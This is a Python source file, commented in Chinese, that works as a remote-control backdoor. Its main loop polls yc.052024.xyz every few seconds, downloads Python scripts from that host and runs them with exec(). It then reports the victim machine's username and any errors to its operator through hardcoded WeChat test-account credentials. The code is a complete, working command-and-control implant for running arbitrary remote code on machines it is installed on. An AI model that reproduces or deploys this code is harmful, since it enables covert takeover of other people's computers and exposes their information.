"""
mm
"""
import os
import json
import time
import requests
import platform
import subprocess
from _thread import *


class Function:
    def __init__(self, main):
        self.main = main
        self.number_of_executions = 0
        ...
    def Connect_Network(self):
        self.number_of_executions += 1
        try:
            requests.get('https://yc.052024.xyz/net.txt', timeout=5)
            return True
        except Exception as bc:
            print(bc)
            return False

    def run_code(self, code):
        self.number_of_executions += 1
        try:
            exec(code)
        except Exception as bc:
            print(bc)
            try:
                self.main.wechat_push.Alleged_information(f'{self.main.sys_username}代码报错：{bc}')
            except Exception as bcl:
                print("发送失败", bcl)

class WeChat_push:
    """
    微信测试号推送被控信息
    """
    def __init__(self):
        # 从测试号信息获取
        self.appID = ""
        self.appSecret = ""

        # 收信人ID即 用户列表中的微信号，
        self.openId = ""


        # 发送信息模板
        self.Vehicle_Submission_id = "V8uPyRsGUGYCzUnsyPlpuYWAjNUg0OjSD3ALmvTlrhE"
    def get_access_token(self):
        # 获取access token的url
        url = 'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid={}&secret={}' \
            .format(self.appID.strip(), self.appSecret.strip())
        response = requests.get(url).json()
        # print(response)
        access_token = response.get('access_token')
        return access_token
    def send_Alleged_information(self, access_token, message):      # 发送被控信息
        body = {
            "touser": self.openId,
            "template_id": self.Vehicle_Submission_id.strip(),
            "url": "https://weixin.qq.com",
            "data": {
                "message": {
                    "value": message
                },
            }
        }
        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token={}'.format(access_token)
        print(requests.post(url, json.dumps(body)).text)
        ...
    def Alleged_information(self, message):
        # 1.获取access_token
        access_token = self.get_access_token()
        # 3. 发送消息
        self.send_Alleged_information(access_token, message)
    def send_to_the_user(self, access_token, num_openid, message):
        body = {
            "touser": num_openid,
            "template_id": self.Vehicle_Submission_id.strip(),
            "url": "https://weixin.qq.com",
            "data": {
                "message": {
                    "value": message
                },
            }
        }
        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token={}'.format(access_token)
        print(requests.post(url, json.dumps(body)).text)
        ...


class Main:
    def __init__(self):
        self.fun = Function(self)
        self.wechat_push = WeChat_push()
        # 初始化配置
        self.wechat_push.appID = 'wxfe87182bd1371294'
        self.wechat_push.appSecret = '7a6e5a3f118f1f3317f57fb065e7c06a'
        self.wechat_push.openId = 'ogur66Me6Rpbfg6vx7RvUKgGO8AY'

        self.system = platform.system()
        self.sys_Version = platform.release()
        self.sys_username = os.getenv('USERNAME')
        self.running = True

        self.startup = False    # 程序启动首次联网执行  /True=已执行
        self.Current_Code = ''  # 当前代码/用来对比服务器代码变化/有变化就执行新代码
        ...

    def Run(self):
        while self.running:
            if self.fun.Connect_Network():
                try:
                    if not self.startup:    # 程序启动连接到网络执行一次（python代码
                        qq = requests.get('https://yc.052024.xyz/Control_files/Start_execution.py')
                        start_new_thread(self.fun.run_code, (qq.text,))     # 程序启动的第一次联网执行远程代码
                        if os.name == 'nt':  # win相同获取用户名
                            self.sys_username = os.getenv('USERNAME')
                        else:
                            self.sys_username = os.getenv('USER')
                        self.wechat_push.Alleged_information(f'{self.sys_username}已联网启动+初始代码执行')
                        self.startup = True
                    else:
                        # 代码有变化就执行
                        qq = requests.get('https://yc.052024.xyz/Control_files/Change_Execution.py')
                        if self.Current_Code != qq.text:
                            start_new_thread(self.fun.run_code, (qq.text, ))
                            self.Current_Code = qq.text
                        else:
                            print('The code is the same, waiting for new execution')# print('code一样，等待新执行')
                except Exception as bc:
                    print(bc)
            else:
                print('wu_net')     # 没有网络

            time.sleep(8)

if __name__ == '__main__':
    m = Main()
    m.Run()
